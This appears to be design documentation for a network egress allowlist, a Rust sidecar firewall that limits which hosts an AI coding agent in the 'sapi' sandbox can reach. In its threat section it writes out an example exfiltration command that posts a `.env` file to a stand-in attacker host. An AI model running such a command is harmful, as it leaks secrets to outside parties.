# Network egress allowlist

**Off by default.** With `network = allowlist`, the agent can reach only the hostnames you list, on ports 80 and 443, and every other connection attempt is dropped and logged. Nothing in the agent container can change that.

```sh
sapi config set network allowlist
sapi config set allow "@providers @github @npm"      # default: @providers
sapi                                                  # or: SAPI_NETWORK=allowlist sapi
sapi netlog                                           # what was allowed, what was denied
```

## Threat

The sandbox bounds what the agent can *read and write*: one directory. It does not bound what the agent can *send*. An agent that was prompt-injected by a README, that ran a malicious `postinstall`, or that is simply wrong can `curl -d @.env attacker.example`, pull a second-stage payload, or tunnel data through DNS. For untrusted code — auditing a dependency, trying a stranger's repository, reviewing a hostile PR — that is the whole risk.

## Design

```
            shared network namespace  (agent: --network container:<sidecar>)
 ┌─────────────────────────────────────────────────────────────────────────────┐
 │ agent container · cap-drop ALL · no NET_ADMIN · no NET_RAW                   │
 │                                                                              │
 │   :53  any uid ≠ 65532 ──┐                                                   │
 │   :443 any uid ≠ 65532 ──┼── iptables REDIRECT ──▶ sapi-egress (uid 65532)   │
 │   :80  any uid ≠ 65532 ──┘      filter OUTPUT      ├ DNS   allowed → 198.18.0.1 │
 │   everything else ────────────── policy DROP ──▶ ✗  │       denied  → NXDOMAIN   │
 │   IPv6 ───────────────────────── policy DROP ──▶ ✗  ├ TLS   SNI  → allowlist → connect by name │
 │                                                     └ HTTP  Host → allowlist → connect by name │
 └─────────────────────────────────────────────────────────────────────────────┘
```

The sidecar is a separate container, `sapi-egress`, started *before* the agent and owning the network namespace the agent then joins. It runs one static Rust binary ([`egress/`](../egress)) that:

1. **Installs the namespace firewall** (as root, `CAP_NET_ADMIN`): `filter OUTPUT` and `INPUT` policy `DROP`; loopback allowed; its own uid allowed; for every *other* uid, TCP 443 → its TLS filter, TCP 80 → its HTTP filter, UDP/TCP 53 → its resolver; `ip6tables` policy `DROP`. If any rule fails to apply, the process exits non-zero and the agent is never started.
2. **Binds** three loopback listeners.
3. **Drops privileges** to uid 65532 — and verifies the drop is real by trying to regain root; if that succeeds, it refuses to run.
4. **Writes a ready marker.** `/run` is a fresh tmpfs on every start, so a restart cannot expose a stale marker; the process also removes any old marker at startup. `sapi` waits for the new file before creating/resuming the agent container. There is no window in which the agent intentionally starts without a completed firewall setup.
5. **Answers DNS itself.** Allowed names get a fixed, non-routable answer (`198.18.0.1`); denied names get `NXDOMAIN`. The agent never performs a real DNS query, so **DNS tunnelling is closed**, and a denial is visible at the first step (`curl: Could not resolve host`).
6. **Reads the hostname** from the TLS `ClientHello` SNI or the HTTP `Host` header (absolute-form request targets take precedence, per RFC 9112; duplicate/malformed `Host` headers are refused as smuggling vectors). No hostname — raw IP, non-TLS on 443, ECH without public SNI — means deny.
7. **Connects by name.** The upstream address is always the proxy's own resolution of the *allowed name*, never the address the client dialled. A client cannot pair an allowed SNI with an attacker's IP. Names resolving to private, loopback, link-local, CGNAT or other non-public ranges are refused (DNS-rebinding defence).
8. **Logs every decision** as one JSON line: `{"t":…,"ev":"allow|deny","proto":"dns|tls|http","host":…,"port":…,"reason":…,"upstream":…,"up":…,"down":…,"ms":…}`. `sapi netlog` prints them.

Why not `HTTPS_PROXY`? Because it is advisory. Node's `fetch`, many CLIs, and anything malicious ignore it. Kernel redirection in a namespace the agent cannot modify is not advisory.

Why not a well-known proxy with a config file? Because the policy here is one thing — "these names, these two ports" — and a small Rust binary that can only express that policy is easier to audit than a general-purpose proxy's configuration surface. There is no bypass flag in the production binary; test hooks require the `test-utils` Cargo feature and are absent from the published image.

## Allowlist syntax

| Entry | Matches |
|---|---|
| `api.anthropic.com` | exactly that host, on 80 and 443 |
| `*.github.com` | any subdomain — not `github.com` itself |
| `registry.example:443` | that host on 443 only (the only explicit ports are 80 and 443) |
| `@providers` | preset (below) |

Comma or space separated. Validated twice — by `sapi` when you set it, and by the sidecar at start. Only DNS-valid names, `*.suffix`, optional `:80`/`:443`, and known presets are accepted. Other ports are rejected because the firewall deliberately never redirects them. Wildcards are passed literally, never expanded against project filenames. A typo cannot become a hole.

Presets:

| Preset | Hosts |
|---|---|
| `@providers` | api.anthropic.com, api.openai.com, openrouter.ai, generativelanguage.googleapis.com, api.mistral.ai, api.groq.com, api.x.ai, api.deepseek.com, api.together.xyz, api.fireworks.ai, api.cerebras.ai, api.cohere.com, api.perplexity.ai |
| `@github` | github.com, \*.github.com, \*.githubusercontent.com, codeload.github.com, ghcr.io, \*.pkg.github.com |
| `@npm` | registry.npmjs.org, \*.npmjs.org, nodejs.org |
| `@pypi` | pypi.org, files.pythonhosted.org, \*.pypi.org |
| `@cargo` | crates.io, static.crates.io, index.crates.io, static.rust-lang.org |
| `@go` | proxy.golang.org, sum.golang.org |
| `@debian` | deb.debian.org, security.debian.org |
| `@huggingface` | huggingface.co, \*.huggingface.co, cdn-lfs.huggingface.co |

`sapi config keys` lists them; `sapi dockerfile`-style transparency applies: the expanded list is passed to the sidecar as `EGRESS_ALLOW` and visible with `docker inspect`.

## Operational notes

- **pi's self-update** needs `@npm`. Without it, sapi skips the update on start (and says so) rather than let it fail noisily.
- **SSH is not available** in allowlist mode (port 22 is dropped). Use HTTPS remotes; pass a token with `SAPI_ENV=GH_TOKEN`.
- **Publishing ports** (`SAPI_DOCKER_ARGS=-p …`) does not work in allowlist mode: inbound is dropped and the port would have to be on the sidecar. Run dev servers in `full` mode.
- **Resume** restarts the sidecar first and waits for the firewall before the agent's namespace comes back. If the sidecar was removed, the agent container is recreated.
- **Changing `allow`** changes the container's network signature, so the next start recreates the pair (sessions are kept, as always).
- The sidecar is capped at 256 MiB and 256 processes, has a read-only root filesystem plus a 1 MiB `/run` tmpfs, and runs with `cap-drop ALL` plus only `NET_ADMIN SETUID SETGID`. Its listener rules are flushed after deny policies on restart, so rules cannot accumulate.
- The agent must not run as uid 65532: that uid belongs to the proxy and is exempt for its own upstream traffic. `sapi` refuses this collision rather than silently opening egress.
- Production images do not contain `--no-firewall`, `--allow-private`, or `--test-upstream`; those hooks exist only in `cargo test --all-features` builds.

## Where the sidecar image comes from

`sapi` pins `ghcr.io/sapiensmalti/sapi-egress` **by digest**, and pins the SHA-256 of the source tarball of the same tag. Both are produced by [`.github/workflows/egress-image.yml`](../.github/workflows/egress-image.yml) from [`egress/`](../egress) — built natively on amd64 and arm64 runners and merged into one manifest. Prefer not to trust the registry?

```sh
SAPI_EGRESS_BUILD=1 sapi
```

builds the sidecar locally from the pinned, checksum-verified source tarball (a `rust:alpine` stage, ~2 minutes once). `SAPI_EGRESS_IMAGE=…` overrides the reference entirely for people who build their own.

## What it does not do

- **Content inspection.** TLS stays end-to-end encrypted; the filter sees hostnames, not bodies. An allowed host is a channel: an agent allowed to reach `github.com` can push to a repository you did not intend. Keep the list to what the task needs, and use `read_only`-style minimal credentials.
- **Egress filtering by IP.** Policy is by name, deliberately. Services that must be reached by raw IP are not supported.
- **Rate or volume limits.** Bytes are counted and logged per connection, not capped.
- **Protect the sidecar from the kernel.** It is a container like any other; for hostile code, run a VM-backed Docker.
- **Replace credentials hygiene.** Everything the agent can read is still readable by the model provider you allow.

## Verifying it yourself

CI checks launcher/recovery behavior in Debian 12/13 userspaces without a Docker socket. Separately, `test/smoke.sh` runs on Linux and macOS CI with real Docker: builds the sidecar, starts it, and from a container sharing its namespace proves that allowed HTTPS/HTTP are reachable, that a denied name, a non-80/443 port and a raw IP are not, that a container without `NET_ADMIN` cannot alter the rules, that restarts are ready and idempotent, that the root filesystem is read-only, and that decisions are logged. The Rust crate's own tests cover the parsers byte-by-byte, the relay's address filter, the firewall rule table, and a live relay through a fake upstream. Read [`egress/src`](../egress/src); it is short on purpose.
